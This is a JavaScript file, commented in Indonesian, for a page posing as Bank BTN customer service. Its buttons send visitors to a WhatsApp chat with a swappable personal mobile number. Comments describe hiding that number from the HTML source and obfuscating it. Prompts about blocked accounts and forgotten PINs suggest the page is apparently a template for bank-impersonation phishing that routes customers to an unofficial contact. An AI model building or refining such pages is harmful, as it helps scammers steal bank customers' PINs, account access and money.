// Konfigurasi WhatsApp - Nomor didefinisikan di JS (tersembunyi dari HTML)
// Nomor tidak muncul di HTML source, hanya di JS yang bisa di-obfuscate
const CONFIG = {
    // Nomor WhatsApp langsung didefinisikan di sini (tetap aman karena di file JS)
    WA_NUMBER: '6282194565774',  // <-- Ganti dengan nomor Anda
    DEFAULT_MESSAGE: 'Halo%20saya%20membutuhkan%20bantuan%20Bank%20BTN',
    SERVICE_HOURS: {
        start: 7,
        end: 22,
        timezone: 'Asia/Jakarta'
    }
};

// Fungsi untuk mendapatkan nomor WhatsApp
function getWhatsAppNumber() {
    return CONFIG.WA_NUMBER;
}

// Data layanan yang sering ditanyakan
const COMMON_ISSUES = [
    { issue: 'Akun Terblokir', message: 'Halo%20saya%20membutuhkan%20bantuan%20terkait%20akun%20saya%20yang%20terblokir%20di%20Bank%20BTN.%20Mohon%20bantuannya.' },
    { issue: 'Lupa PIN', message: 'Halo%20saya%20lupa%20PIN%20akun%20Bank%20BTN.%20Mohon%20bantuan%20untuk%20reset%20PIN.' },
    { issue: 'Kendala Transaksi', message: 'Halo%20saya%20mengalami%20kendala%20dalam%20melakukan%20transaksi%20di%20Bank%20BTN.%20Mohon%20bantuannya.' },
    { issue: 'Informasi KPR', message: 'Halo%20saya%20ingin%20menanyakan%20informasi%20mengenai%20KPR%20Bank%20BTN.' }
];

// Fungsi untuk membuat link WhatsApp
function createWhatsAppLink(message = CONFIG.DEFAULT_MESSAGE) {
    const waNumber = getWhatsAppNumber();
    if (!waNumber) {
        console.error('WhatsApp number not configured!');
        return null;
    }
    // Bersihkan nomor dari karakter non-digit
    const cleanNumber = waNumber.replace(/\D/g, '');
    return `https://wa.me/${cleanNumber}?text=${message}`;
}

// Fungsi untuk membuka WhatsApp
function openWhatsApp(message = CONFIG.DEFAULT_MESSAGE, source = 'main') {
    const link = createWhatsAppLink(message);
    if (link) {
        console.log('Opening WhatsApp link:', link);
        window.open(link, '_blank');
        trackWhatsAppClick(source);
    } else {
        alert('Maaf, layanan WhatsApp sedang tidak tersedia. Silakan hubungi call center 1500 286.');
    }
}

// Fungsi untuk mengecek jam operasional
function checkOperationalHours() {
    try {
        const now = new Date();
        // Konversi ke WIB (UTC+7)
        const wibTime = new Date(now.toLocaleString('en-US', { timeZone: 'Asia/Jakarta' }));
        const hours = wibTime.getHours();
        const isOperational = hours >= CONFIG.SERVICE_HOURS.start && hours < CONFIG.SERVICE_HOURS.end;
        
        const statusElement = document.getElementById('operationalStatus');
        if (statusElement) {
            if (isOperational) {
                statusElement.innerHTML = '✅ Layanan sedang aktif | Respon cepat dalam 5-10 menit';
                statusElement.style.color = '#25D366';
            } else {
                statusElement.innerHTML = '⏰ Di luar jam operasional (07.00-22.00 WIB), pesan akan direspon besok pagi';
                statusElement.style.color = '#ff9800';
            }
        }
        
        return isOperational;
    } catch (error) {
        console.error('Error checking operational hours:', error);
        return true;
    }
}

// Fungsi untuk menambahkan tombol issue cepat
function addQuickIssueButtons() {
    const container = document.getElementById('quickIssuesContainer');
    if (!container) return;
    
    container.innerHTML = '<div class="quick-issues-title">🔍 Pilih masalah yang dialami untuk respon lebih cepat:</div>';
    
    COMMON_ISSUES.forEach(issue => {
        const button = document.createElement('button');
        button.className = 'quick-issue-btn';
        button.textContent = issue.issue;
        button.setAttribute('aria-label', `Bantuan untuk masalah ${issue.issue}`);
        button.onclick = () => {
            openWhatsApp(issue.message, `quick_issue_${issue.issue.toLowerCase().replace(/\s/g, '_')}`);
        };
        container.appendChild(button);
    });
}

// Fungsi untuk tracking WhatsApp click
function trackWhatsAppClick(source = 'main') {
    const timestamp = new Date().toISOString();
    const eventData = {
        event: 'whatsapp_click',
        source: source,
        timestamp: timestamp,
        url: window.location.href,
        user_agent: navigator.userAgent
    };
    
    console.log('Tracking event:', eventData);
    
    // Simpan ke localStorage
    try {
        let clicks = localStorage.getItem('wa_clicks') || '[]';
        let clicksArray = JSON.parse(clicks);
        clicksArray.push(eventData);
        if (clicksArray.length > 100) clicksArray = clicksArray.slice(-100);
        localStorage.setItem('wa_clicks', JSON.stringify(clicksArray));
    } catch (e) {
        console.warn('Could not save to localStorage:', e);
    }
}

// Fungsi untuk inisialisasi event listeners
function initializeEventListeners() {
    const waButton = document.getElementById('waButton');
    if (waButton) {
        waButton.addEventListener('click', (e) => {
            e.preventDefault();
            console.log('WA Button clicked');
            openWhatsApp(CONFIG.DEFAULT_MESSAGE, 'button');
        });
    }
    
    const topWaBanner = document.getElementById('topWaBanner');
    if (topWaBanner) {
        topWaBanner.addEventListener('click', (e) => {
            e.preventDefault();
            console.log('Top banner clicked');
            openWhatsApp(CONFIG.DEFAULT_MESSAGE, 'top_banner');
        });
    }
}

// Lazy loading images
function lazyLoadImages() {
    if ('IntersectionObserver' in window) {
        const imageObserver = new IntersectionObserver((entries, observer) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    const img = entry.target;
                    if (img.dataset.src) {
                        img.src = img.dataset.src;
                    }
                    img.classList.add('loaded');
                    observer.unobserve(img);
                }
            });
        });
        
        document.querySelectorAll('img[data-src]').forEach(img => {
            imageObserver.observe(img);
        });
    }
}

// Performance monitoring
function reportPerformance() {
    if ('performance' in window && 'getEntriesByType' in performance) {
        const paintMetrics = performance.getEntriesByType('paint');
        paintMetrics.forEach(metric => {
            console.log(`${metric.name}: ${metric.startTime}ms`);
        });
    }
}

// Keyboard shortcut: Ctrl + Shift + C untuk copy nomor
function addKeyboardShortcut() {
    document.addEventListener('keydown', (e) => {
        if (e.ctrlKey && e.shiftKey && e.key === 'C') {
            e.preventDefault();
            const waNumber = getWhatsAppNumber();
            if (waNumber) {
                navigator.clipboard.writeText(waNumber).then(() => {
                    showNotification('✅ Nomor WhatsApp tersalin!', '#25D366');
                }).catch(() => {
                    showNotification('❌ Gagal menyalin nomor', '#ff4444');
                });
            }
        }
    });
}

// Fungsi notifikasi
function showNotification(message, bgColor = '#25D366') {
    const notification = document.createElement('div');
    notification.textContent = message;
    notification.style.cssText = `
        position: fixed;
        bottom: 20px;
        right: 20px;
        background: ${bgColor};
        color: white;
        padding: 12px 20px;
        border-radius: 40px;
        font-size: 14px;
        z-index: 1000;
        animation: fadeInOut 2s ease;
    `;
    document.body.appendChild(notification);
    setTimeout(() => notification.remove(), 2000);
}

// Smooth scroll untuk anchor links
function addSmoothScroll() {
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener('click', function (e) {
            const targetId = this.getAttribute('href');
            if (targetId && targetId !== '#') {
                e.preventDefault();
                const target = document.querySelector(targetId);
                if (target) {
                    target.scrollIntoView({ behavior: 'smooth', block: 'start' });
                }
            }
        });
    });
}

// Debug function - cek apakah konfigurasi berjalan
function debugConfig() {
    console.log('=== Bank BTN CS Debug ===');
    console.log('WA Number:', getWhatsAppNumber());
    console.log('WA Link:', createWhatsAppLink());
    console.log('Button element:', document.getElementById('waButton'));
    console.log('Banner element:', document.getElementById('topWaBanner'));
    console.log('=========================');
}

// Inisialisasi halaman
function init() {
    console.log('Bank BTN CS Page initialized');
    debugConfig();
    
    // Report performance
    reportPerformance();
    
    // Inisialisasi event
    initializeEventListeners();
    
    // Cek jam operasional
    checkOperationalHours();
    
    // Add quick issues container
    const infoText = document.querySelector('.info-text');
    if (infoText && !document.getElementById('quickIssuesContainer')) {
        const quickContainer = document.createElement('div');
        quickContainer.id = 'quickIssuesContainer';
        quickContainer.className = 'quick-issues-container';
        infoText.insertAdjacentElement('afterend', quickContainer);
        
        const statusContainer = document.createElement('div');
        statusContainer.id = 'operationalStatus';
        statusContainer.className = 'operational-status';
        quickContainer.insertAdjacentElement('afterend', statusContainer);
        
        addQuickIssueButtons();
        checkOperationalHours();
    }
    
    // Smooth scroll
    addSmoothScroll();
    
    // Keyboard shortcut
    addKeyboardShortcut();
    
    // Lazy load images
    lazyLoadImages();
}

// Run on DOM ready
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
} else {
    init();
            }
